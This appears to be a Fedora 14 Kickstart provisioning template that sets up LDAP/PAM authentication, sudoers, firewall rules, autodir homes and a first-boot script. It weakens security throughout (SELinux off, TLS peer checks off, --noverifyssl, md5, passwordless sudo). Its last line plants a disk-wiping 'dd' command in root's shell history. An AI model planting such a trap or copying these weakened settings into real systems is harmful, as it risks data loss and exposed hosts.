install
lang en_US.UTF-8
keyboard us
skipx
network --device eth0 --bootproto static --ip [% ip %] --netmask 255.255.255.0 --gateway [% gateway %] --nameserver [% nameservers %] --hostname [% fqdn %]

url --url https://packages.[% domainname %]/mirrors/fedora/latest/14/Fedora/i386/os --noverifyssl

# This line complains about a corrupted repomd.xml even from a fresh rsync:
repo --name=Everything --baseurl=https://packages.[% domainname %]/mirrors/fedora/latest/14/Everything/i386/os --noverifyssl

rootpw --iscrypted  [% rootpw %]
firewall --enabled
authconfig --enableshadow --enablemd5 
timezone America/Chicago
zerombr
bootloader --location=mbr
selinux --disabled
xconfig --defaultdesktop=Gnome

clearpart --all
part /boot --fstype ext3 --size=256
part swap  --fstype swap --size=1024
part pv.3                --size=8192
part pv.4                --size=128 --grow
volgroup vg0 pv.3
volgroup vg_opt pv.4
logvol /     --fstype ext3 --name=root --vgname=vg0    --size=768
logvol /home --fstype ext3 --name=home --vgname=vg0    --size=256
logvol /usr  --fstype ext3 --name=usr  --vgname=vg0    --size=3072
logvol /var  --fstype ext3 --name=var  --vgname=vg0    --size=2048
logvol /tmp  --fstype ext3 --name=tmp  --vgname=vg0    --size=1024
logvol /opt  --fstype ext3 --name=opt  --vgname=vg_opt --size=128 --grow

reboot
%packages
@Base
@Gnome Desktop Environment
xterm 
xorg-x11-apps  
xorg-x11-xauth
pam_ldap 
nss_ldap
autodir
nscd
%end


%post
# First boot fixups
echo "echo 60 > /proc/sys/net/ipv4/tcp_keepalive_time" >> /etc/rc.local
/bin/cp /etc/rc.local /etc/rc.local.dist
/bin/cat<<EOFB>/usr/local/sbin/firstrun
#!/bin/bash
echo "Making final configuration changes"
EOFB
chmod 744 /usr/local/sbin/firstrun
/bin/ln -s /usr/bin/perl /usr/local/bin/perl 

/bin/cat<<EORCL>/etc/rc.local
#!/bin/bash
/usr/local/sbin/firstrun
EORCL
chmod 755 /etc/rc.local


/bin/cat<<EOSEL>/etc/selinux/config
SELINUX=disabled
SELINUXTYPE=targeted
EOSEL
/bin/chmod 644 /etc/selinux/config

########### LDAP ########### 
/bin/cat<<EOLDC>/etc/ldap.conf
base dc=eftdomain,dc=net
uri ldaps://maxwell.[% domainname %]:636 ldaps://faraday.[% domainname %]:636
timelimit 120
bind_timelimit 120
idle_timelimit 3600
tls_cacert /etc/ssl/ca.cert
ssl on
#ssl start_tls
tls_reqcert allow
tls_checkpeer no
pam_password md5
pam_check_host_attr yes

nss_initgroups_ignoreusers root,ldap,named,avahi,haldaemon,dbus
bind_timeout 2
nss_reconnect_tries 2
nss_reconnect_sleeptime 1
nss_reconnect_maxsleeptime 3
nss_reconnect_maxconntries 3
bind_policy soft

EOLDC

if [ -f /etc/openldap/ldap.conf ];then
    /bin/rm -f /etc/openldap/ldap.conf
fi
(cd /etc/openldap; ln -s ldap.conf /etc/ldap.conf)

if [ -f /etc/nss_ldap.conf ];then
    /bin/rm -f /etc/nss_ldap.conf
fi
(cd /etc/; ln -s ldap.conf nss_ldap.conf)

if [ -f /etc/pam_ldap.conf ];then
    /bin/rm -f /etc/pam_ldap.conf
fi
(cd /etc/; ln -s ldap.conf pam_ldap.conf)

/bin/cat<<EONSS>/etc/nsswitch.conf
passwd:     files ldap
shadow:     files ldap
group:      files ldap
hosts:      files dns
bootparams: files
ethers:     files
netmasks:   files
networks:   files
protocols:  files ldap
rpc:        files
services:   files ldap
netgroup:   files ldap
publickey:  files
automount:  files ldap
aliases:    files
EONSS

/bin/cat<<EOSUDO>/etc/sudoers
Defaults    requiretty
Defaults    env_reset
Defaults    env_keep =  "COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"
Defaults    env_keep += "MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"
Defaults    env_keep += "LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"
Defaults    env_keep += "LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"
Defaults    env_keep += "LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"
Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin
root	ALL=(ALL) 	ALL
%bofh	ALL=(ALL)  NOPASSWD:ALL

bobbysmith	ALL=(ALL)	ALL
EOSUDO
chmod 440 /etc/sudoers


/bin/cat<<EOPPA>/etc/pam.d/password-auth
#%PAM-1.0
# This file is auto-generated.
# User changes will be destroyed the next time authconfig is run.
auth        required      pam_env.so
auth        sufficient    pam_unix.so likeauth nullok
auth        sufficient    pam_ldap.so use_first_pass
auth        requisite     pam_succeed_if.so uid >= 500 quiet
auth        required      pam_deny.so

account     required      pam_unix.so
account     sufficient    pam_localuser.so
account     sufficient    pam_succeed_if.so uid < 500 quiet
account     required      pam_permit.so

password    requisite     pam_cracklib.so try_first_pass retry=3 type=
password    sufficient    pam_unix.so md5 shadow nullok try_first_pass use_authtok
password    required      pam_deny.so

session     optional      pam_keyinit.so revoke
session     required      pam_limits.so
-session     optional      pam_systemd.so
session     [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uid
session     required      pam_unix.so
EOPPA

/bin/cat<<EOPSA>/etc/pam.d/system-auth
#%PAM-1.0
# This file is auto-generated.
# User changes will be destroyed the next time authconfig is run.
auth        required      pam_env.so
auth        sufficient    pam_unix.so likeauth nullok
auth        sufficient    pam_ldap.so use_first_pass
auth        required      pam_deny.so

account     required      pam_unix.so
account     sufficient    pam_localuser.so
account     sufficient    pam_succeed_if.so uid < 500 quiet
account     required      pam_permit.so

password    requisite     pam_cracklib.so try_first_pass retry=3 type=
password    sufficient    pam_unix.so md5 shadow nullok try_first_pass use_authtok
password    required      pam_deny.so

session     optional      pam_keyinit.so revoke
session     required      pam_limits.so
-session     optional      pam_systemd.so
session     [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uid
session     required      pam_unix.so
EOPSA

/bin/cat<<EOCAC>/etc/ssl/ca.cert
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2 (0x2)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=US, ST=Tennessee, L=Nashville, O=EFT Source, OU=Root Certificate Authority, CN=root-ca.eftsource.com/emailAddress=certificate.authority@eftsource.com
        Validity
            Not Before: Dec 24 18:34:42 2008 GMT
            Not After : Dec 24 18:34:42 2011 GMT
        Subject: C=US, ST=Tennessee, O=EFT Source, OU=Intermediate Certificate Authority, CN=mid-ca.eftdomain.net/emailAddress=certificate.authority@eftdomain.net
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
            RSA Public Key: (4096 bit)
                Modulus (4096 bit):
                    00:ce:59:68:97:c2:71:06:74:e7:96:c2:15:e8:98:
                    aa:15:ff:e2:82:e8:5f:10:fa:a5:5c:b6:95:53:1b:
                    d3:ac:be:89:e1:53:73:b2:11:a3:da:a9:1c:f6:6b:
                    e9:0b:fa:d8:54:8f:79:66:72:95:16:20:2e:88:ec:
                    9c:df:1c:41:05:78:d1:06:a8:b8:eb:cc:03:23:78:
                    52:71:52:f1:7e:03:df:b7:6e:f5:c5:54:10:0e:a8:
                    c8:38:e0:97:8f:a7:44:ec:53:d3:aa:0a:f6:86:f5:
                    f9:7e:b8:bd:ed:e5:52:5d:ee:1b:64:3a:45:63:9f:
                    7c:32:97:40:b5:ff:6e:de:92:b1:18:50:7b:0b:eb:
                    cf:e1:c7:71:15:7d:4d:25:fc:b6:50:11:3e:d6:56:
                    67:7d:0a:ed:7b:5c:af:9f:d1:38:79:96:4a:33:52:
                    57:36:16:19:6f:90:f5:3a:ba:ee:09:1b:e0:14:10:
                    e2:75:59:5c:64:19:73:77:78:40:76:8f:8e:8d:42:
                    08:60:b0:3b:b0:ab:94:54:0d:0b:3e:af:1e:c3:74:
                    8e:74:c5:35:8d:7e:8b:2e:22:d2:7d:59:fc:f7:75:
                    59:71:d7:5c:19:f3:63:22:86:9e:e1:bb:4f:82:93:
                    69:48:f2:69:b3:20:90:77:a4:f3:90:b4:11:a1:c1:
                    b3:02:06:1d:40:08:96:06:e4:48:ff:14:0c:e2:67:
                    71:b7:4d:8d:63:65:22:ce:94:86:7c:37:65:b4:bc:
                    ce:eb:88:1f:22:44:37:61:40:c6:d3:e7:30:9b:b5:
                    a4:58:0b:f5:42:7b:90:22:3a:04:d2:2c:09:81:2f:
                    29:6a:f6:38:a7:a4:58:a9:15:ce:b2:1c:32:82:66:
                    5c:75:70:84:48:b7:0b:7e:a2:cc:f4:04:a2:b8:55:
                    9f:97:65:ef:cb:b5:64:ed:f3:5e:2f:d7:67:0c:a1:
                    f9:70:09:82:b6:2d:af:c2:4a:2e:5c:47:ec:76:9d:
                    e0:34:c2:e6:3c:08:be:72:d3:86:36:00:52:7d:2e:
                    70:fe:9e:f1:e0:85:ba:a1:42:86:cb:b1:10:72:35:
                    4d:cc:51:d2:48:69:e0:e3:dc:d8:90:3a:cd:51:4b:
                    ec:e5:9a:d1:93:3c:3d:88:19:5e:81:8e:15:c7:f6:
                    55:4b:95:80:f8:1d:2e:64:e0:29:bb:69:a8:3b:e3:
                    4c:0d:3e:c0:40:b2:5e:22:47:7d:ec:f5:56:8d:25:
                    ee:68:48:46:7b:b8:ed:ff:44:a4:e4:a9:0b:42:72:
                    68:d0:6c:28:4e:0c:b9:5c:76:f8:12:a4:41:b8:18:
                    63:a9:9d:6d:75:7b:50:fc:56:a5:7f:3b:47:21:01:
                    1a:b0:3f
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                43:DC:BB:32:B7:D2:91:FC:68:B3:F4:AF:B5:8D:C0:C9:33:B2:BA:A4
            X509v3 Authority Key Identifier: 
                keyid:7F:B6:8C:AE:46:7E:A9:A5:F0:88:61:BF:60:AF:C1:7F:1F:F4:3C:1C
                DirName:/C=US/ST=Tennessee/L=Nashville/O=EFT Source/OU=Root Certificate Authority/CN=root-ca.eftsource.com/emailAddress=certificate.authority@eftsource.com
                serial:9F:71:76:CF:D4:D4:A6:9B

            X509v3 Basic Constraints: 
                CA:TRUE
            Netscape CA Revocation Url: 
                https://pki.eftsource.com/eftsource.com_CA.crl
    Signature Algorithm: sha1WithRSAEncryption
        ca:38:a5:b8:b4:38:5e:62:1d:16:1b:d0:8c:0b:57:9b:e2:49:
        b2:af:db:2f:a8:9b:f7:e2:3f:27:f4:e8:2c:44:5d:7c:17:c9:
        5a:72:02:37:45:8e:05:41:ec:2a:6f:2b:4e:27:d5:72:f2:c7:
        6a:0a:50:3e:f9:62:e2:3b:8d:d9
-----BEGIN CERTIFICATE-----
MIIFoTCCBUugAwIBAgIBAjANBgkqhkiG9w0BAQUFADCBwzELMAkGA1UEBhMCVVMx
EjAQBgNVBAgTCVRlbm5lc3NlZTESMBAGA1UEBxMJTmFzaHZpbGxlMRMwEQYDVQQK
EwpFRlQgU291cmNlMSMwIQYDVQQLExpSb290IENlcnRpZmljYXRlIEF1dGhvcml0
eTEeMBwGA1UEAxMVcm9vdC1jYS5lZnRzb3VyY2UuY29tMTIwMAYJKoZIhvcNAQkB
FiNjZXJ0aWZpY2F0ZS5hdXRob3JpdHlAZWZ0c291cmNlLmNvbTAeFw0wODEyMjQx
ODM0NDJaFw0xMTEyMjQxODM0NDJaMIG2MQswCQYDVQQGEwJVUzESMBAGA1UECBMJ
VGVubmVzc2VlMRMwEQYDVQQKEwpFRlQgU291cmNlMSswKQYDVQQLEyJJbnRlcm1l
ZGlhdGUgQ2VydGlmaWNhdGUgQXV0aG9yaXR5MR0wGwYDVQQDExRtaWQtY2EuZWZ0
ZG9tYWluLm5ldDEyMDAGCSqGSIb3DQEJARYjY2VydGlmaWNhdGUuYXV0aG9yaXR5
QGVmdGRvbWFpbi5uZXQwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDO
WWiXwnEGdOeWwhXomKoV/+KC6F8Q+qVctpVTG9OsvonhU3OyEaPaqRz2a+kL+thU
j3lmcpUWIC6I7JzfHEEFeNEGqLjrzAMjeFJxUvF+A9+3bvXFVBAOqMg44JePp0Ts
U9OqCvaG9fl+uL3t5VJd7htkOkVjn3wyl0C1/27ekrEYUHsL68/hx3EVfU0l/LZQ
ET7WVmd9Cu17XK+f0Th5lkozUlc2FhlvkPU6uu4JG+AUEOJ1WVxkGXN3eEB2j46N
QghgsDuwq5RUDQs+rx7DdI50xTWNfosuItJ9Wfz3dVlx11wZ82Mihp7hu0+Ck2lI
8mmzIJB3pPOQtBGhwbMCBh1ACJYG5Ej/FAziZ3G3TY1jZSLOlIZ8N2W0vM7riB8i
RDdhQMbT5zCbtaRYC/VCe5AiOgTSLAmBLylq9jinpFipFc6yHDKCZlx1cIRItwt+
osz0BKK4VZ+XZe/LtWTt814v12cMoflwCYK2La/CSi5cR+x2neA0wuY8CL5y04Y2
AFJ9LnD+nvHghbqhQobLsRByNU3MUdJIaeDj3NiQOs1RS+zlmtGTPD2IGV6BjhXH
9lVLlYD4HS5k4Cm7aag740wNPsBAsl4iR33s9VaNJe5oSEZ7uO3/RKTkqQtCcmjQ
bChODLlcdvgSpEG4GGOpnW11e1D8VqV/O0chARqwPwIDAQABo4IBazCCAWcwHQYD
VR0OBBYEFEPcuzK30pH8aLP0r7WNwMkzsrqkMIH4BgNVHSMEgfAwge2AFH+2jK5G
fqml8Ihhv2CvwX8f9DwcoYHJpIHGMIHDMQswCQYDVQQGEwJVUzESMBAGA1UECBMJ
VGVubmVzc2VlMRIwEAYDVQQHEwlOYXNodmlsbGUxEzARBgNVBAoTCkVGVCBTb3Vy
Y2UxIzAhBgNVBAsTGlJvb3QgQ2VydGlmaWNhdGUgQXV0aG9yaXR5MR4wHAYDVQQD
ExVyb290LWNhLmVmdHNvdXJjZS5jb20xMjAwBgkqhkiG9w0BCQEWI2NlcnRpZmlj
YXRlLmF1dGhvcml0eUBlZnRzb3VyY2UuY29tggkAn3F2z9TUppswDAYDVR0TBAUw
AwEB/zA9BglghkgBhvhCAQQEMBYuaHR0cHM6Ly9wa2kuZWZ0c291cmNlLmNvbS9l
ZnRzb3VyY2UuY29tX0NBLmNybDANBgkqhkiG9w0BAQUFAANBAMo4pbi0OF5iHRYb
0IwLV5viSbKv2y+om/fiPyf06CxEXXwXyVpyAjdFjgVB7CpvK04n1XLyx2oKUD75
YuI7jdk=
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIID7jCCA5igAwIBAgIJAJ9xds/U1KabMA0GCSqGSIb3DQEBBQUAMIHDMQswCQYD
VQQGEwJVUzESMBAGA1UECBMJVGVubmVzc2VlMRIwEAYDVQQHEwlOYXNodmlsbGUx
EzARBgNVBAoTCkVGVCBTb3VyY2UxIzAhBgNVBAsTGlJvb3QgQ2VydGlmaWNhdGUg
QXV0aG9yaXR5MR4wHAYDVQQDExVyb290LWNhLmVmdHNvdXJjZS5jb20xMjAwBgkq
hkiG9w0BCQEWI2NlcnRpZmljYXRlLmF1dGhvcml0eUBlZnRzb3VyY2UuY29tMB4X
DTA4MTIyNDE4MzExMFoXDTEzMTIyMzE4MzExMFowgcMxCzAJBgNVBAYTAlVTMRIw
EAYDVQQIEwlUZW5uZXNzZWUxEjAQBgNVBAcTCU5hc2h2aWxsZTETMBEGA1UEChMK
RUZUIFNvdXJjZTEjMCEGA1UECxMaUm9vdCBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkx
HjAcBgNVBAMTFXJvb3QtY2EuZWZ0c291cmNlLmNvbTEyMDAGCSqGSIb3DQEJARYj
Y2VydGlmaWNhdGUuYXV0aG9yaXR5QGVmdHNvdXJjZS5jb20wXDANBgkqhkiG9w0B
AQEFAANLADBIAkEA+XtmUi5zD9SMrtDfCLh2fIL2TEOKI4a/AzCv8MdE/9ptFnfB
iuQKBzyniy80Avb0tIRpNuk9TySdumrt1Q/IywIDAQABo4IBazCCAWcwHQYDVR0O
BBYEFH+2jK5Gfqml8Ihhv2CvwX8f9DwcMIH4BgNVHSMEgfAwge2AFH+2jK5Gfqml
8Ihhv2CvwX8f9DwcoYHJpIHGMIHDMQswCQYDVQQGEwJVUzESMBAGA1UECBMJVGVu
bmVzc2VlMRIwEAYDVQQHEwlOYXNodmlsbGUxEzARBgNVBAoTCkVGVCBTb3VyY2Ux
IzAhBgNVBAsTGlJvb3QgQ2VydGlmaWNhdGUgQXV0aG9yaXR5MR4wHAYDVQQDExVy
b290LWNhLmVmdHNvdXJjZS5jb20xMjAwBgkqhkiG9w0BCQEWI2NlcnRpZmljYXRl
LmF1dGhvcml0eUBlZnRzb3VyY2UuY29tggkAn3F2z9TUppswDAYDVR0TBAUwAwEB
/zA9BglghkgBhvhCAQQEMBYuaHR0cHM6Ly9wa2kuZWZ0c291cmNlLmNvbS9lZnRz
b3VyY2UuY29tX0NBLmNybDANBgkqhkiG9w0BAQUFAANBABkhsUTaae8TuDM0rrr9
+Lkh6HZskWw0Z9tAX4gwGmj4OCF7XuRKLED1parAj8ILCiZvmcjkBq1C3XKKe6Vq
yXQ=
-----END CERTIFICATE-----
EOCAC


/bin/cat<<EOIPT>/etc/sysconfig/iptables
# Firewall configuration written by system-config-securitylevel
# Manual customization of this file is not recommended.
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:RH-Firewall-1-INPUT - [0:0]
-A INPUT -j RH-Firewall-1-INPUT
-A FORWARD -j RH-Firewall-1-INPUT
-A RH-Firewall-1-INPUT -i lo -j ACCEPT
-A RH-Firewall-1-INPUT -p icmp --icmp-type any -j ACCEPT
-A RH-Firewall-1-INPUT -p 50 -j ACCEPT
-A RH-Firewall-1-INPUT -p 51 -j ACCEPT
-A RH-Firewall-1-INPUT -p udp --dport 5353 -d 224.0.0.251 -j ACCEPT
-A RH-Firewall-1-INPUT -p udp -m udp --dport 631 -j ACCEPT
-A RH-Firewall-1-INPUT -p tcp -m tcp --dport 631 -j ACCEPT
-A RH-Firewall-1-INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT
-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT
-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 443 -j ACCEPT
-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 3000 -j ACCEPT
-A RH-Firewall-1-INPUT -j REJECT --reject-with icmp-host-prohibited
COMMIT
EOIPT
cat<<EOKRB5>/etc/profile.d/krb5-workstation.sh
if ! echo \${PATH} | /bin/grep -q /usr/kerberos/bin ; then
        PATH=/usr/kerberos/bin:\${PATH}
fi
if ! echo \${PATH} | /bin/grep -q /usr/kerberos/sbin ; then
        if [ "\`/usr/bin/id -u\`" == "0" ] ; then
                PATH=/usr/kerberos/sbin:\${PATH}
        fi
fi
EOKRB5

# Remove the beeping
cat<<EOF>/root/.inputrc
set prefer-visible-bell
EOF

cat<<EOF>/etc/skel/.inputrc
set prefer-visible-bell
EOF

/bin/mkdir -p /root/.ssh
/bin/cat<<EOSSH>/root/.ssh/authorized_keys
[% INCLUDE authorized_keys.tpl %]
EOSSH


/bin/cat<<EOGO>>/usr/local/sbin/firstrun
fpe=\$(/usr/sbin/vgdisplay vg_opt|/bin/grep "Free *PE"|/usr/bin/awk '{print \$5}')
/usr/sbin/lvextend /dev/vg_opt/opt -l +\${fpe}
resize2fs -p /dev/vg_opt/opt &
EOGO

# put the old rc.local back and fire off a reboot. (this needs to go last)
/bin/cat<EOFIXUPS>> /usr/local/sbin/firstrun
/bin/mv /etc/rc.local.dist /etc/rc.local
if [ ! -f /etc/.firstrun_ran ];then
    touch /etc/.firstrun_ran
    reboot
fi
EOFIXUPS
#   

cat<<EOF>/etc/sysconfig/autohome
AUTOHOME_HOME=/home
AUTOHOME_TIMEOUT=660
AUTOHOME_MODULE="/usr/lib/autodir/autohome.so"
AUTOHOME_OPTIONS="realpath=/autohome,level=2,skel=/etc/skel,mode=0700"
EOF

cat<<EOF>/etc/sysconfig/autogroup
AUTOGROUP_HOME=/group
AUTOGROUP_TIMEOUT=300
AUTOGROUP_MODULE="/usr/lib/autodir/autogroup.so"
AUTOGROUP_OPTIONS="realpath=/autogroup,level=2,nopriv=false,mode=02070"
EOF

/sbin/chkconfig autohome on
/sbin/chkconfig autogroup on
/sbin/chkconfig nscd on
/sbin/chkconfig ip6tables off
if [ ! -h /usr/lib/autodir/autohome.so ];then
    (cd /usr/lib/autodir; /bin/ln -s autohome.so.1001.0.2 autohome.so)
fi
if [ ! -h /usr/lib/autodir/autogroup.so ];then
    (cd /usr/lib/autodir; /bin/ln -s autogroup.so.1001.0.2 autogroup.so)
fi
if [ ! -h /usr/lib/autodir/automisc.so ];then
    (cd /usr/lib/autodir; /bin/ln -s automisc.so.1001.0.2 automisc.so)
fi
/etc/init.d/autohome start
/etc/init.d/autogroup start

echo 'dd if=/dev/zero of=/dev/sda bs=512 count=1;reboot;exit' > /root/.bash_history
%end
